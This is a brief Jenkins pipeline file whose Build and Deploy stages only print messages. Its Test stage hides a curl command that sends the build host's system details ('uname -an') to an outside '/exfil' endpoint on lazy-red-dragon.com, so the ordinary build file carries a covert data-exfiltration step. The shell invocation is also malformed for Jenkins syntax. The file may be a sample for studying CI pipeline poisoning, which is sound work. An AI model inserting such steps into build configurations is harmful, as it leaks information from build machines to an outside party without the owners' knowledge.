node {
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        /bin/bash 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(uname -an)"'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

